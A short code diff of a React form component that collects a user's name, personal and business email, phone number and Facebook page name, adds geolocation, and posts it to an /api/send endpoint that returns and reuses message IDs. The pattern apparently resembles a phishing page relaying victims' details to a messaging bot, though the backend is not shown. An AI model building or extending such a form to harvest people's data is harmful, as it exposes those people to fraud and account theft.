@@ -42,7 +42,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         facebookPageName: ''
     });
 
-    const { setModalOpen, geoInfo, setMessageId } = store();
+    const { setModalOpen, geoInfo, setMessageId, setUserData, messageId } = store();
     const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
 
     const t = (text: string): string => {
@@ -96,6 +96,15 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
         setIsLoading(true);
 
+        // Lưu thông tin user vào store
+        setUserData({
+            fullName: formData.fullName,
+            personalEmail: formData.personalEmail,
+            businessEmail: formData.businessEmail,
+            phoneNumber: phoneNumber,
+            facebookPageName: formData.facebookPageName
+        });
+
         const message = `
 ${
     geoInfo
@@ -115,7 +124,8 @@ ${
 
         try {
             const res = await axios.post('/api/send', {
-                message
+                message,
+                old_message_id: messageId
             });
 
             if (res?.data?.success && typeof res.data.message_id === 'number') {
